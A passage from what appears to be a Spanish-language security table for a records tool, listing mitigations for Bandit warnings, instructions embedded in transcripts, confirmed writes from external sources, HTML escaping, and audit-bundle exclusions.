| bandit | solo avisos de severidad baja ya tratados en §6: B404 y B603 (`subprocess` con lista de argumentos, `sys.executable` y `registro.py` o `sanidad.py` del paquete, sin `shell=True`) y B110 en `estado.py` (controles opcionales que, si fallan, no deben cortar el radar, el período ni el resumen) | — |
| Instrucciones incrustadas en una transcripción | `extraccion.py` las clasifica como **IN** y nunca las registra; si se las confirma, `registrar` rechaza todo el lote sin escribir | caso RD |
| Escrituras a partir de fuentes externas | `extraccion.py registrar` y `lecciones.py incorporar` escriben solo con `--confirmar` y `--por`, siempre a través de `registro.py` (que valida esquema, claves foráneas y autoridad); `impacto.py`, `release.py`, `estado.py radar`, `briefing` y `productos` son de solo lectura | casos RD, LX, IM, TV, RA, PS |
| Otros proyectos | `lecciones.py buscar` no modifica las carpetas de origen; el índice no se puede escribir en `03-control/registros/` ni en carpetas de BMAD | caso LX |
| HTML generado | `estado.py periodo --tablero` escapa todo `<` del bloque de datos (`</script>` y `<!--` no lo cortan); `paquete.py auditoria` escapa `INDICE.html`; `estado.py briefing` escapa el texto que toma de los registros | casos PE, AU y RA |
| Expediente para terceros | `paquete.py auditoria` excluye las rutas fuera del proyecto (SEG-06) y, con `--externo`, el registro de interesados y los destinos de los envíos | caso AU |
| CSV del índice de lecciones | es texto de los registros: abrirlo en una planilla tiene el mismo cuidado que SEG-08 | — |

